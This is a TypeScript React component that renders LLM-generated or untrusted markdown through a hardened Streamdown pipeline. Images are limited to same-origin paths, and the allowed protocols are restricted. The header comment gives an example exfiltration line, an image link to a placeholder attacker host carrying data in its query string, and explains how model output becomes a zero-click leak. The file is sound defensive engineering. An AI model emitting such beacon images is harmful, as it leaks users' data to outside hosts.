/**
 * SafeMarkdown — the ONLY sanctioned way to render LLM/untrusted markdown.
 *
 * H-L8: Streamdown 2.3's default rehype-harden config is
 * `allowedImagePrefixes: ["*"]`, so LLM-authored `![](https://attacker/?d=…)`
 * is a zero-click exfiltration beacon. Streamdown 2.3 exposes no top-level
 * allowed*Prefixes props, so we pass its own default rehype pipeline
 * (raw → sanitize → harden) with a tightened harden config:
 *   - images: same-origin paths only (plus inline data:image/*, which cannot beacon)
 *   - links:  same-origin paths and http(s) (rehype-harden cannot express an
 *             "https://"-only prefix; external links still go through
 *             Streamdown's linkSafety confirmation modal, which is on by default)
 *   - protocols: rehype-harden's safe set only (no custom schemes)
 *
 * Do not import `Streamdown` directly elsewhere — use this component.
 */
import type { ComponentProps } from "react";
import { Streamdown, defaultRehypePlugins } from "streamdown";

type Pluggable = NonNullable<ComponentProps<typeof Streamdown>["rehypePlugins"]>[number];

const [hardenPlugin] = defaultRehypePlugins.harden as unknown as [unknown, unknown];

const DEFAULT_ORIGIN =
  typeof window !== "undefined" && window.location?.origin ? window.location.origin : "http://localhost";

export const SAFE_HARDEN_OPTIONS = {
  defaultOrigin: DEFAULT_ORIGIN,
  allowedImagePrefixes: ["/"],
  allowedLinkPrefixes: ["/", "*"],
  allowedProtocols: [] as string[],
  allowDataImages: true,
} as const;

export const SAFE_REHYPE_PLUGINS: Pluggable[] = [
  defaultRehypePlugins.raw,
  defaultRehypePlugins.sanitize,
  [hardenPlugin, SAFE_HARDEN_OPTIONS] as unknown as Pluggable,
];

export type SafeMarkdownProps = Omit<ComponentProps<typeof Streamdown>, "rehypePlugins">;

export function SafeMarkdown(props: SafeMarkdownProps) {
  return <Streamdown {...props} rehypePlugins={SAFE_REHYPE_PLUGINS} />;
}

export default SafeMarkdown;
